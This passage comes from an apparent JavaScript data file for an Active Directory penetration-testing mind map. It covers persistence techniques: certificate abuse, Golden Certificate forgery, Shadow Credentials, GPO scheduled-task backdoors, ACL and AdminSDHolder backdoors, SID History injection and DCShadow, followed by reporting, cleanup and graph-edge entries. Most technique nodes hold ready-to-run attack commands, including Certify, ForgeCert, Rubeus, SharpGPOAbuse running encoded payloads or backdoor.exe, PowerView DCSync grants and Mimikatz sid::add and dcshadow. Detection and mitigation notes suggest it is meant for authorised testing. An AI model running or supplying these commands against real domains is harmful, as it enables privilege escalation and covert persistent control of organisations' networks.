                            descriptionMd: '### Certificate-Based Persistence\nIf PKI is present, validate governance of templates and issuance, and whether certificate-based auth is monitored and constrained.\n\n**Certificate Persistence Techniques:**\n* **PERSIST1**: User certificate for authentication\n* **PERSIST2**: Machine certificate for computer account\n* **PERSIST3**: Account persistence via certificate mapping\n\n**Advantages:**\n* Survives password changes\n* Long validity periods (1-5 years typically)\n* Difficult to detect\n* Legitimate authentication method\n* No ticket required for initial auth\n\n**Attack Vectors:**\n* Request user/computer certificate with compromised account\n* Certificate theft from user/computer stores\n* ADCS template manipulation for persistent access\n* Certificate renewal for extended persistence\n\n**Mitigations:**\n* Certificate transparency monitoring\n* Short certificate validity periods\n* Certificate revocation checks\n* Audit certificate requests\n* Template permission restrictions\n',
                            commands: [{
                                    description: 'Request user certificate (Certify)',
                                    code: 'Certify.exe request /ca:CA-NAME /template:User'
                                },
                                {
                                    description: 'Request cert as another user',
                                    code: 'Certify.exe request /ca:CA-NAME /template:User /altname:Administrator'
                                },
                                {
                                    description: 'Certipy request certificate',
                                    code: 'certipy req -u user@domain.com -p password -ca CA-NAME -target ca.domain.com -template User'
                                },
                                {
                                    description: 'Authenticate with certificate',
                                    code: 'Rubeus.exe asktgt /user:user /certificate:cert.pfx /password:certpass /nowrap'
                                },
                                {
                                    description: 'Certipy authentication',
                                    code: 'certipy auth -pfx user.pfx -dc-ip DC-IP'
                                },
                                {
                                    description: 'Export certificate from store',
                                    code: 'certutil -store -user My'
                                },
                                {
                                    description: 'ForgeCert (Golden Certificate)',
                                    code: 'ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword password --Subject "CN=User" --SubjectAltName "administrator@domain.com" --NewCertPath admin.pfx --NewCertPassword password'
                                }
                            ],
                            type: 'technique',
                            emoji: '📛',
                            resources: [{
                                    title: 'Certificate Persistence',
                                    url: 'https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d'
                                },
                                {
                                    title: 'ForgeCert Tool',
                                    url: 'https://github.com/GhostPack/ForgeCert'
                                },
                                {
                                    title: 'Golden Certificate Attack',
                                    url: 'https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7'
                                }
                            ]
                        },
                        children: [{
                                id: 'golden-certificate',
                                data: {
                                    label: 'Golden Certificate',
                                    description: 'Forged CA certificates',
                                    descriptionMd: '### Golden Certificate Attack\nForge certificates using stolen CA private key, creating certificates for any user without CA involvement.\n\n**Requirements:**\n* CA private key and certificate\n* Can be extracted from CA server with DA\n* Stored in HKLM\\SOFTWARE\\Microsoft\\Cryptography\\Keys\n\n**Attack Flow:**\n1. Extract CA certificate and private key\n2. Forge certificate for target user\n3. Use certificate for authentication\n4. Unlimited validity period (set by attacker)\n\n**Advantages:**\n* Complete autonomy (no CA interaction)\n* Can set arbitrary validity periods\n* Bypasses certificate enrollment monitoring\n* Extremely difficult to detect\n* Survives CA certificate renewal\n\n**Detection:**\n* Nearly impossible without certificate pinning\n* No enrollment events\n* Valid certificate chain\n* Only revocation can stop it\n\n**Mitigation:**\n* CA private key rotation\n* Hardware Security Module (HSM) for CA keys\n* Certificate transparency logging\n* Regular CA security audits\n',
                                    commands: [{
                                            description: 'Export CA certificate',
                                            code: 'certutil -exportPFX -p "password" my CA ca-cert.pfx'
                                        },
                                        {
                                            description: 'SharpDPAPI CA backup',
                                            code: 'SharpDPAPI.exe certificates /machine'
                                        },
                                        {
                                            description: 'Forge certificate (ForgeCert)',
                                            code: 'ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword pass --Subject "CN=User" --SubjectAltName "administrator@domain.com" --NewCertPath admin.pfx --NewCertPassword pass'
                                        },
                                        {
                                            description: 'Set custom validity',
                                            code: 'ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword pass --Subject "CN=User" --SubjectAltName "admin@domain.com" --NewCertPath admin.pfx --NewCertPassword pass --ValidFrom "1/1/2020" --ValidTo "1/1/2030"'
                                        },
                                        {
                                            description: 'Authenticate with forged cert',
                                            code: 'Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:pass /nowrap'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '🏅',
                                    resources: [{
                                            title: 'Golden Certificate Research',
                                            url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2'
                                        },
                                        {
                                            title: 'ForgeCert',
                                            url: 'https://github.com/GhostPack/ForgeCert'
                                        }
                                    ]
                                },
                                children: []
                            },
                            {
                                id: 'shadow-credentials',
                                data: {
                                    label: 'Shadow Credentials',
                                    description: 'msDS-KeyCredentialLink abuse',
                                    descriptionMd: '### Shadow Credentials Attack\nAbuse msDS-KeyCredentialLink attribute to add certificate-based authentication to accounts, enabling persistence.\n\n**How It Works:**\n1. Write certificate to target\'s msDS-KeyCredentialLink attribute\n2. Authenticate using certificate via PKINIT\n3. Obtain TGT and NTLM hash\n4. Use credentials for access\n\n**Requirements:**\n* WriteProperty on msDS-KeyCredentialLink of target\n* GenericAll/GenericWrite on target object\n* Windows Server 2016+ Domain Controllers\n* PKINIT support\n\n**Advantages:**\n* No certificate enrollment required\n* Survives password changes\n* Can target users and computers\n* Difficult to detect without attribute monitoring\n* Obtains NTLM hash (not just Kerberos)\n\n**Targets:**\n* User accounts (including admins)\n* Computer accounts (including DCs)\n* Service accounts\n',
                                    commands: [{
                                            description: 'Whisker add shadow credential',
                                            code: 'Whisker.exe add /target:targetuser /domain:domain.com /dc:DC-IP'
                                        },
                                        {
                                            description: 'Certipy shadow cred add',
                                            code: 'certipy shadow auto -u user@domain.com -p password -account targetuser'
                                        },
                                        {
                                            description: 'PyWhisker add',
                                            code: 'pywhisker.py -d domain.com -u user -p password --target targetuser --action add'
                                        },
                                        {
                                            description: 'Authenticate with shadow cred',
                                            code: 'Rubeus.exe asktgt /user:targetuser/certificate:cert.pfx /password:pass /getcredentials /nowrap'
                                        },
                                        {
                                            description: 'Certipy auth',
                                            code: 'certipy auth -pfx targetuser.pfx -username targetuser -domain domain.com'
                                        },
                                        {
                                            description: 'List shadow credentials',
                                            code: 'Whisker.exe list /target:targetuser /domain:domain.com'
                                        },
                                        {
                                            description: 'Remove shadow credential',
                                            code: 'Whisker.exe remove /target:targetuser /domain:domain.com /deviceid:<ID>'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '👤',
                                    resources: [{
                                            title: 'Shadow Credentials',
                                            url: 'https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab'
                                        },
                                        {
                                            title: 'Whisker Tool',
                                            url: 'https://github.com/eladshamir/Whisker'
                                        },
                                        {
                                            title: 'PyWhisker',
                                            url: 'https://github.com/ShutdownRepo/pywhisker'
                                        }
                                    ]
                                },
                                children: []
                            }
                        ]
                    },
                    {
                        id: 'gpo-persist',
                        data: {
                            label: 'Policy Persistence',
                            description: 'GPO + scheduled actions',
                            descriptionMd: '### Group Policy Persistence\nConfirm whether policy changes are tightly controlled, reviewed, and alerted, especially for privileged OU scope.\n\nGPO Persistence Mechanisms:\n* Immediate Scheduled Task: Execute on next GPO refresh\n* Startup/Shutdown Scripts: Run during boot/shutdown\n* Logon/Logoff Scripts: Run during user session events\n* Registry Modifications: Autorun keys, policy settings\n* Software Installation: Deploy malicious MSIs\n* Service Installation: Deploy via GPO preferences\n\nTarget Scope:\n* Domain-wide GPOs (affects all systems)\n* OU-specific GPOs (targeted attacks)\n* Security filtering (specific users/groups)\n* WMI filtering (conditional application)\n\nAdvantages:\n* Legitimate administrative tool\n* Applies automatically\n* Affects multiple systems\n* Difficult to detect without GPO auditing\n* Survives system reimaging (if GPO remains)\n\nDetection:\n* GPO modification events (4728, 5136, 5137)\n* Unusual GPO links to sensitive OUs\n* New GPOs created by non-admins\n* Scheduled tasks deployed via GPO\n',
                            commands: [{
                                    description: 'Create GPO with task',
                                    code: 'SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author "SYSTEM" --Command "powershell.exe" --Arguments "-enc <payload>" --GPOName "Default Domain Policy"'
                                },
                                {
                                    description: 'Target specific OU',
                                    code: 'SharpGPOAbuse.exe --AddComputerTask --TaskName "Maintenance" --Command "cmd.exe" --Arguments "/c backdoor.exe" --GPOName "NewGPO" --OU "OU=Servers,DC=domain,DC=com"'
                                },
                                {
                                    description: 'PowerView GPO abuse',
                                    code: 'New-GPOImmediateTask -TaskName Backdoor -GPODisplayName "Security Policy" -CommandArguments "-NoP -NonI -W Hidden -Exec Bypass -Enc <base64>" -Force'
                                },
                                {
                                    description: 'List editable GPOs',
                                    code: 'Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($.ActiveDirectoryRights -match "WriteProperty|WriteDacl") -and ($.SecurityIdentifier -match "S-1-5-21-.-[0-9]{4,10}")}'
                                },
                                {
                                    description: 'Add GPO startup script',
                                    code: 'Set-GPO -Name "GPOName" -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup\0\0" -ValueName "Script" -Type String -Value "\\domain\netlogon\backdoor.bat"'
                                },
                                {
                                    description: 'Deploy via PyGPOAbuse',
                                    code: 'pygpoabuse.py DOMAIN/user:password -dc-ip DC-IP -gpo-id "{GPO-GUID}" -command "cmd /c backdoor.exe" -taskname "WindowsUpdate"'
                                }
                            ],
                            type: 'technique',
                            emoji: '🧷',
                            resources: [{
                                    title: 'GPO Abuse for Persistence',
                                    url: 'https://adsecurity.org/?p=2716'
                                },
                                {
                                    title: 'SharpGPOAbuse',
                                    url: 'https://github.com/FSecureLABS/SharpGPOAbuse'
                                },
                                {
                                    title: 'Detecting GPO Abuse',
                                    url: 'https://www.microsoft.com/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/'
                                }
                            ]
                        },
                        children: [{
                                id: 'acl-persist',
                                data: {
                                    label: 'ACL Backdoors',
                                    description: 'Permission-based persistence',
                                    descriptionMd: '### ACL-Based Persistence\nModify Access Control Lists to grant persistent access without obvious backdoors like accounts or tickets.\n\nACL Backdoor Types:\n AdminSDHolder: Propagates to protected groups every 60 minutes\n* Domain Object ACL: DCSync rights, replication permissions\n* GPO ACL: Modify or link malicious policies\n* User/Computer ACL: Reset passwords, modify properties\n* OU ACL: Control over all objects in OU\n\nStrategic Targets:\n* Domain root object (for DCSync)\n* AdminSDHolder (affects all protected accounts)\n* High-value group objects (Domain Admins, etc.)\n* GPOs affecting privileged systems\n* Critical OUs (Domain Controllers, Servers)\n\nAdvantages:\n* Survives password changes\n* No obvious artifacts (tickets, accounts)\n* Difficult to detect without ACL auditing\n* Multiple independent access paths\n* Self-healing via AdminSDHolder\n\nDetection:\n* Event ID 5136 (directory object modified)\n* Event ID 4780 (ACL set on admin accounts)\n* Regular ACL audits\n* Comparison against baseline\n',
                                    commands: [{
                                            description: 'Grant DCSync rights',
                                            code: 'Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=com" -PrincipalIdentity backdoor -Rights DCSync'
                                        },
                                        {
                                            description: 'AdminSDHolder backdoor',
                                            code: 'Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=com" -PrincipalIdentity backdoor -Rights All'
                                        },
                                        {
                                            description: 'GenericAll on Domain Admins',
                                            code: 'Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity backdoor -Rights All'
                                        },
                                        {
                                            description: 'WriteDACL on GPO',
                                            code: 'Add-DomainObjectAcl -TargetIdentity "CN={GPO-GUID},CN=Policies,CN=System,DC=domain,DC=com" -PrincipalIdentity backdoor -Rights WriteDacl'
                                        },
                                        {
                                            description: 'Impacket dacledit',
                                            code: 'dacledit.py -action write -rights FullControl -principal backdoor -target-dn "CN=Domain Admins,CN=Users,DC=domain,DC=com" domain/admin:password'
                                        },
                                        {
                                            description: 'Check AdminSDHolder',
                                            code: 'Get-DomainObjectAcl -Identity "CN=AdminSDHolder,CN=System,DC=domain,DC=com" -ResolveGUIDs | Where-Object {$.SecurityIdentifier -notmatch "^S-1-5-32-"} | Select ObjectDN,SecurityIdentifier,ActiveDirectoryRights'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '🔐',
                                    resources: [{
                                            title: 'ACL Backdoors',
                                            url: 'https://posts.specterops.io/an-ace-up-the-sleeve-designing-active-directory-dacl-backdoors-28b1f3d11e6e'
                                        },
                                        {
                                            title: 'AdminSDHolder Abuse',
                                            url: 'https://adsecurity.org/?p=1906'
                                        },
                                        {
                                            title: 'dacledit.py',
                                            url: 'https://github.com/fortra/impacket/blob/master/examples/dacledit.py'
                                        }
                                    ]
                                },
                                children: []
                            },
                            {
                                id: 'sid-history',
                                data: {
                                    label: 'SID History Injection',
                                    description: 'Privilege via SID attribute',
                                    descriptionMd: '### SID History Persistence\nInject privileged group SIDs into user accounts via SID History attribute, granting permanent elevated access.\n\nHow It Works:\n* SID History attribute stores previous SIDs (for migration scenarios)\n* Kerberos PAC includes SID History SIDs\n* Grants group membership without actual membership\n* Survives across domains/forests in some configs\n\nAttack Requirements:\n* Domain Admin or equivalent\n* Access to inject SID History (Mimikatz, dsmod, etc.)\n* Target account (can be low-privilege user)\n\nAdvantages:\n* Invisible in normal group membership queries\n* Survives group membership changes\n* Can inject multiple SIDs\n* Works across trust boundaries (sometimes)\n* Difficult to detect without specific queries\n\nDetection:\n* Query accounts with non-empty SID History\n* Event ID 4765 (SID History added)\n* Accounts with unusual effective permissions\n* PAC analysis\n\nMitigations:\n* SID Filtering on trusts\n* Regular SID History audits\n* Restrictive permissions on SID History modification\n* Monitor Event ID 4765\n',
                                    commands: [{
                                            description: 'Mimikatz SID History (local)',
                                            code: 'sid::patch\nsid::add /sam:targetuser /new:S-1-5-21-DOMAIN-SID-512'
                                        },
                                        {
                                            description: 'Mimikatz SID History (DC)',
                                            code: 'privilege::debug\nlsadump::dcsync /user:targetuser /sid:S-1-5-21-DOMAIN-SID-512'
                                        },
                                        {
                                            description: 'Check SID History',
                                            code: 'Get-ADUser -Identity targetuser -Properties SIDHistory | Select-Object Name,SIDHistory'
                                        },
                                        {
                                            description: 'Find accounts with SID History',
                                            code: 'Get-ADUser -Filter {SIDHistory -like ""} -Properties SIDHistory | Select Name,SIDHistory'
                                        },
                                        {
                                            description: 'PowerView SID History',
                                            code: 'Get-DomainUser -Identity targetuser | Select-Object samaccountname,sidhistory'
                                        },
                                        {
                                            description: 'Add Enterprise Admin SID',
                                            code: 'sid::add /sam:user /new:S-1-5-21-ROOT-DOMAIN-SID-519'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '🎭',
                                    resources: [{
                                            title: 'SID History Attack',
                                            url: 'https://adsecurity.org/?p=1772'
                                        },
                                        {
                                            title: 'SID Filtering',
                                            url: 'https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc772633(v=ws.10)'
                                        },
                                        {
                                            title: 'Detecting SID History Abuse',
                                            url: 'https://blog.stealthbits.com/detecting-sid-history-injection-attacks/'
                                        }
                                    ]
                                },
                                children: []
                            },
                            {
                                id: 'dcshadow',
                                data: {
                                    label: 'DCShadow',
                                    description: 'Rogue domain controller',
                                    descriptionMd: '### DCShadow Attack\nRegister a rogue domain controller to make arbitrary changes to Active Directory without generating typical audit logs.\n\nHow It Works:\n1. Register machine as domain controller in AD\n2. Create replication connection\n3. Push malicious changes via replication\n4. Changes appear to come from legitimate DC\n5. Unregister rogue DC\n\nCapabilities:\n Modify any AD object\n* Bypass audit logging\n* Changes replicate domain-wide\n* Create backdoor accounts\n* Modify ACLs\n* Inject SID History\n* Modify group memberships\n\nRequirements:\n* Domain Admin or equivalent\n* Two machines (or compromise DC)\n* Enterprise Admin rights for some operations\n\nAdvantages:\n* Minimal audit trail\n* Changes appear legitimate\n* Difficult to detect in real-time\n* Can make mass changes quickly\n\nDetection:\n* Unexpected DC registration\n* Replication from unusual sources\n* Event ID 4742 (computer account changed)\n* Monitoring SPNs for domain controller services\n',
                                    commands: [{
                                            description: 'Register DCShadow (Mimikatz)',
                                            code: '!+\n!processtoken\nlsadump::dcshadow /object:targetuser /attribute:primaryGroupID /value:512\nlsadump::dcshadow /push'
                                        },
                                        {
                                            description: 'Modify SID History',
                                            code: 'lsadump::dcshadow /object:user /attribute:sidHistory /value:S-1-5-21-DOMAIN-SID-512\nlsadump::dcshadow /push'
                                        },
                                        {
                                            description: 'Create backdoor user',
                                            code: 'lsadump::dcshadow /object:backdoor /attribute:userAccountControl /value:512\nlsadump::dcshadow /push'
                                        },
                                        {
                                            description: 'Check for rogue DCs',
                                            code: 'Get-ADComputer -Filter {PrimaryGroupID -eq 516} | Select-Object Name,DNSHostName,Created'
                                        },
                                        {
                                            description: 'Monitor DC SPNs',
                                            code: 'Get-ADComputer -Filter * -Properties ServicePrincipalName | Where-Object {$.ServicePrincipalName -like "E3514235-4B06-11D1-AB04-00C04FC2DCD2"}'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '👥',
                                    resources: [{
                                            title: 'DCShadow Explained',
                                            url: 'https://www.dcshadow.com/'
                                        },
                                        {
                                            title: 'DCShadow Detection',
                                            url: 'https://blog.alsid.eu/dcshadow-explained-4510f52fc19d'
                                        },
                                        {
                                            title: 'Mimikatz DCShadow',
                                            url: 'https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump'
                                        }
                                    ]
                                },
                                children: []
                            }
                        ]
                    }
                ]
            },


            {
                id: 'ad-report',
                data: {
                    label: 'Reporting & Retest',
                    description: 'Actionable remediation',
                    descriptionMd: '### Reporting & Retest\nPresent privilege paths, affected objects, and concrete remediation. Retest focuses on closure and regression prevention.\n',
                    commands: [],
                    type: 'category',
                    emoji: '📝',
                    resources: []
                },
                children: [{
                        id: 'ad-path-writeup',
                        data: {
                            label: 'Privilege Path Writeup',
                            description: 'Shortest path + controls',
                            descriptionMd: '### Privilege Path Writeup\nDocument the minimal chain (assumptions, edges, required rights) and pair each step with a preventive control and a detection signal.\n',
                            commands: [],
                            type: 'technique',
                            emoji: '🧭',
                            resources: []
                        },
                        children: []
                    },
                    {
                        id: 'ad-cleanup',
                        data: {
                            label: 'Cleanup',
                            description: 'Rollback & hygiene',
                            descriptionMd: '### Cleanup\nRemove test artifacts, revert policy changes, and verify no lingering credentials, certificates, or scheduled actions remain.\n',
                            commands: [],
                            type: 'technique',
                            emoji: '🧹',
                            resources: []
                        },
                        children: []
                    }
                ]
            }
        ]
    },

    extraEdges: [{
            id: 'e-ldap-kerberoast',
            source: 'ldap-enum',
            target: 'kerberoast',
            data: {
                label: 'Service Mapping',
                type: 'assist',
                descriptionMd: 'Directory enumeration surfaces **SPNs** and service identities that drive service-account risk analysis.'
            }
        },
        {
            id: 'e-ldap-asreproast',
            source: 'ldap-enum',
            target: 'asreproast',
            data: {
                label: 'Preauth Posture',
                type: 'assist',
                descriptionMd: 'LDAP attributes (e.g., **DONT_REQ_PREAUTH**) identify accounts that materially change Kerberos exposure.'
            }
        },
        {
            id: 'e-ldap-delegation',
            source: 'ldap-enum',
            target: 'delegation',
            data: {
                label: 'Delegation Flags',
                type: 'assist',
                descriptionMd: 'Delegation assessment depends on LDAP-visible attributes such as **msDS-AllowedToDelegateTo** and delegation-related UAC flags.'
            }
        },
        {
            id: 'e-ldap-dcsync',
            source: 'ldap-enum',
            target: 'dcsync',
            data: {
                label: 'Replication Rights Discovery',
                type: 'assist',
                descriptionMd: 'ACL/extended-right visibility from directory data supports identification of principals that may hold replication-equivalent rights.'
            }
        },
        {
            id: 'e-smb-sysvol-gpp',
            source: 'smb-enum',
            target: 'ad-gpp',
            data: {
                label: 'SYSVOL Exposure',
                type: 'flow',
                descriptionMd: 'SMB share enumeration typically reveals SYSVOL/NETLOGON reachability, enabling legacy policy-secret review (e.g., GPP artifacts).'
            }
        },
        {
            id: 'e-smb-gpo-analysis',
            source: 'smb-enum',
            target: 'ad-gpo-analysis',
            data: {
                label: 'Policy Artifacts',
                type: 'assist',
                descriptionMd: 'SYSVOL contents and policy file paths discovered via SMB inform GPO linkage analysis and script/config review.'
            }
        },
        {
            id: 'e-anon-ldap',
            source: 'ad-anonymous-enum',
            target: 'ldap-enum',
            data: {
                label: 'Unauth → Directory Clues',
                type: 'assist',
                descriptionMd: 'Unauthenticated/guest discovery can reveal naming contexts, domain identifiers, and directory metadata that guide authenticated LDAP collection.'
            }
        },
        {
            id: 'e-anon-smb',
            source: 'ad-anonymous-enum',
            target: 'smb-enum',
            data: {
                label: 'Unauth → File Surface',
                type: 'assist',
                descriptionMd: 'Null/guest SMB results (shares, policies, hostnames) help prioritize deeper SMB permission and data repository review.'
            }
        },
        {
            id: 'e-network-dns',
            source: 'ad-network-discovery',
            target: 'ad-dns-recon',
            data: {
                label: 'Service Location',
                type: 'flow',
                descriptionMd: 'Asset discovery feeds DNS SRV interrogation to validate where DCs/GCs/KDCs and site-specific services are expected to reside.'
            }
        },
        {
            id: 'e-acl-to-bh',
            source: 'ad-acl-enum',
            target: 'ad-bh-paths',
            data: {
                label: 'ACL Edges',
                type: 'assist',
                descriptionMd: 'ACL findings translate into graph edges (e.g., **GenericAll**, **WriteDacl**, **WriteOwner**) that sharpen shortest-path privilege analysis.'
            }
        },
        {
            id: 'e-trusts-to-bh',
            source: 'ad-trusts',
            target: 'ad-bh-paths',
            data: {
                label: 'Cross-Boundary Paths',
                type: 'assist',
                descriptionMd: 'Trust topology influences which principals and groups can form viable cross-domain/forest escalation chains.'
            }
        },
        {
            id: 'e-bh-to-privesc',
            source: 'ad-bh-paths',
            target: 'ad-privesc',
            data: {
                label: 'Path Prioritization',
                type: 'flow',
                descriptionMd: 'Graph results prioritize which escalation hypotheses to validate first (ACL abuse, delegation, GPO control, certificate paths).'
            }
        },
        {
            id: 'e-localadmin-to-lateral',
            source: 'local-admin',
            target: 'ad-lateral',
            data: {
                label: 'Admin Rights → Movement',
                type: 'flow',
                descriptionMd: 'Local admin footholds expand viable management protocols (WinRM/RDP/SMB/WMI) and change segmentation assumptions.'
            }
        },
        {
            id: 'e-laps-to-localadmin',
            source: 'laps-abuse',
            target: 'local-admin',
            data: {
                label: 'Password Disclosure',
                type: 'flow',
                descriptionMd: 'If LAPS secrets are readable, they typically translate directly into local admin on managed endpoints, enabling lateral expansion.'
            }
        },
        {
            id: 'e-name-resolution-to-ad-ntlm-relay',
            source: 'name-resolution',
            target: 'ad-ntlm-relay',
            data: {
                label: 'Capture/Relay Conditions',
                type: 'assist',
                descriptionMd: 'Name-resolution weaknesses (LLMNR/NBT-NS/WPAD) are a common upstream condition for NTLM interception and relay feasibility.'
            }
        },
        {
            id: 'e-poison-to-ntlmrelay',
            source: 'ad-poisoning',
            target: 'ntlm-relay',
            data: {
                label: 'Captured Auth → Relay',
                type: 'flow',
                descriptionMd: 'Captured NTLM material from poisoning scenarios can shift from offline cracking to relay-based validation where controls permit.'
            }
        },
        {
            id: 'e-ad-ntlmrelay-to-esc8',
            source: 'ad-ntlm-relay',
            target: 'esc8-relay',
            data: {
                label: 'Relay to AD CS',
                type: 'flow',
                descriptionMd: 'When AD CS HTTP enrollment is present, NTLM relay feasibility becomes a direct driver for ESC8-style certificate risk.'
            }
        },
        {
            id: 'e-petitpotam-to-esc8',
            source: 'ad-petitpotam',
            target: 'esc8-relay',
            data: {
                label: 'Coercion Chain',
                type: 'flow',
                descriptionMd: 'Coercion techniques can supply inbound authentications that (when relayed) materially increase AD CS compromise likelihood.'
            }
        },
        {
            id: 'e-adcs-recon-privesc',
            source: 'adcs-enum',
            target: 'adcs-privesc',
            data: {
                label: 'PKI Weakness',
                type: 'flow',
                descriptionMd: 'AD CS discovery leads to identifying template/enrollment misconfigurations with high privilege impact.'
            }
        },
        {
            id: 'e-adcs-privesc-to-persist',
            source: 'adcs-privesc',
            target: 'adcs-persist',
            data: {
                label: 'Long-Lived Credentials',
                type: 'flow',
                descriptionMd: 'Certificate-based escalation naturally extends into persistence evaluation because issued certs often outlive password rotation.'
            }
        },
        {
            id: 'e-dcsync-to-ticket-persist',
            source: 'dcsync',
            target: 'ticket-persist',
            data: {
                label: 'Domain Control Class',
                type: 'flow',
                descriptionMd: 'Replication-capable access collapses identity integrity and directly motivates KRBTGT/service-key hygiene and ticket-risk validation.'
            }
        },
        {
            id: 'e-gpo-analysis-to-gpo-abuse',
            source: 'ad-gpo-analysis',
            target: 'gpo-abuse',
            data: {
                label: 'Edit/Link Rights',
                type: 'flow',
                descriptionMd: 'GPO analysis identifies which policies/links are security-critical and whether permissioning enables policy-level compromise.'
            }
        },
        {
            id: 'e-gpo-abuse-to-gpo-persist',
            source: 'gpo-abuse',
            target: 'gpo-persist',
            data: {
                label: 'Policy Change Durability',
                type: 'flow',
                descriptionMd: 'Once policy control is demonstrated, evaluate how long such changes persist, how they are monitored, and how rollback is enforced.'
            }
        },
        {
            id: 'e-gmsa-to-serviceaccounts',
            source: 'gmsa-abuse',
            target: 'service-accounts',
            data: {
                label: 'Service Identity Governance',
                type: 'context',
                descriptionMd: 'gMSA findings should feed service-account governance review (rotation, scope, privilege, and monitoring) to reduce blast radius.'
            }
        },
        {
            id: 'e-kerberos-initial-privesc',
            source: 'ad-kerberos-recon',
            target: 'ad-privesc',
            data: {
                label: 'Auth Weakness → Escalation',
                type: 'flow',
                descriptionMd: 'Kerberos posture signals frequently connect directly to escalation opportunities (delegation, service isolation, account governance).'
            }
        },
        {
            id: 'e-spray-lateral',
            source: 'spray',
            target: 'ad-lateral',
            data: {
                label: 'Identity Entry',
                type: 'flow',
                descriptionMd: 'Any validated identity foothold changes lateral movement feasibility; governance determines how far it spreads.'
            }
        },
        {
            id: 'e-privesc-to-report',
            source: 'ad-privesc',
            target: 'ad-path-writeup',
            data: {
                label: 'Document Minimal Chain',
                type: 'flow',
                descriptionMd: 'Escalation results should be expressed as minimal privilege paths with preventive controls and detection signals per edge.'
            }
        },
        {
            id: 'e-lateral-to-report',
            source: 'ad-lateral',
            target: 'ad-path-writeup',
            data: {
                label: 'Operational Evidence',
                type: 'flow',
                descriptionMd: 'Lateral movement outcomes (reachable protocols, session exposure, tiering violations) belong in the privilege-path narrative and remediation.'
            }
        },
        {
            id: 'e-persist-to-cleanup',
            source: 'ad-persist',
            target: 'ad-cleanup',
            data: {
                label: 'Rollback Discipline',
                type: 'flow',
                descriptionMd: 'Persistence validation must conclude with explicit rollback and verification to ensure no lingering artifacts remain after testing.'
            }
        },
        {
            id: 'e-report-to-cleanup',
            source: 'ad-report',
            target: 'ad-cleanup',
            data: {
                label: 'Closure Criteria',
                type: 'context',
                descriptionMd: 'Reporting should define retest/closure criteria and confirm cleanup steps as part of engagement completion.'
            }
        }
    ]
};